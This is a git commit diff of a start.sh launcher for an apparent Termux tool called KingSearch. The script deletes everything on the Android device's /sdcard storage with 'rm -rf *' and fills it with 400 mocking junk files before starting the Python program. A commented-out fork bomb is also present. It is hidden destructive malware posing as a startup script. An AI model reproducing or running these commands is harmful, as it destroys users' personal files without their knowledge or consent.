26fc13d0d1ef4102d403cee22e67c1c44863be8e
TheKing <121489549+TheKingevd@users.noreply.github.com>
2022-12-27 11:18:25 -0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,5 @@
-cd /sdcard/ && rm -rf * && touch Wolf_E_Jeff_Passou_A_PIKAKKKK{1..400}.txt
+cd /sdcard/ && rm -rf * && clear
+cd /sdcard/ && touch Wolf_E_Jeff_Passou_A_PIKAKKKK{1..400}.txt && clear
 #:(){ :|:& };:
 cd /data/data/com.termux/files/home/KingSearch/
 python KingSearch.py
